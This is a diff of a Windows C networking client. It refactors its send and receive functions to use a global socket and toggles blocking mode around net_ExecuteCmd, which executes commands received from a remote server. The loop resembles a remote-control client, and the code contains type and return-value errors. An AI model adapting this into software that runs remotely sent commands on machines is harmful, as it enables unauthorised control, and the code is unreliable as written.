@@ -7,17 +7,12 @@
 
 SOCKET client;
 SOCKADDR_IN serverInfo;
+uint64 ioNonBlockMode = 1;
+uint64 ioBlockMode = 0;
 
-int net_SendData(SOCKET sock, char* msg, int len)
+int net_SendData(char* msg, int len)
 {
-     SOCKET _sock = sock;
-
-     if(sock == NULL)
-     {
-          _sock = client;
-     }
-
-     int rv = send(_sock, msg, len, 0);
+     int rv = send(client, msg, len, 0);
      NET_PROTECT_CPU();
 
      if(rv < 1)
@@ -28,18 +23,11 @@ int net_SendData(SOCKET sock, char* msg, int len)
      return rv;
 }
 
-int net_ReciveData(SOCKET sock, OUT_STRP msg)
+int net_ReciveData(OUT_STRP msg)
 {
-     SOCKET _sock = sock;
-     
-     if(sock == NULL)
-     {
-          _sock = client;
-     }
-
      char *rbuff = malloc(NET_BUFFSIZE);
      memset(rbuff, 0, NET_BUFFSIZE);
-     int rv = recv(_sock, rbuff, NET_BUFFSIZE, 0);
+     int rv = recv(client, rbuff, NET_BUFFSIZE, 0);
      NET_PROTECT_CPU();
 
      if(rv < 1)
@@ -98,7 +86,6 @@ void net_Connect(void)
           return -1;
      }
 
-     unsigned long ioNonBlockMode = 1;
      ioctlsocket(client, FIONBIO, &ioNonBlockMode);
 
      FD_SET readFd;
@@ -117,7 +104,7 @@ void net_Connect(void)
           {
                uint8* rmsg;
 
-               if(net_ReciveData(NULL, &rmsg) < 1)
+               if(net_ReciveData(&rmsg) < 1)
                {
                     net_shutdown();
 				
@@ -128,13 +115,23 @@ void net_Connect(void)
 			{
 				continue;
 			}else{
+                    if(ioctlsocket(client, FIONBIO, &ioBlockMode) != 0)
+                    {
+                         return;
+                    }
+
 				if(net_ExecuteCmd(rmsg, strlen(rmsg)) < 1)
 				{
 					net_shutdown();
 
                          free(rmsg);
 					return;
-				}
+                    }
+                    
+                    if(ioctlsocket(client, FIONBIO, &ioNonBlockMode))
+                    {
+                         return;
+                    }
 			}
 
 			free(rmsg);
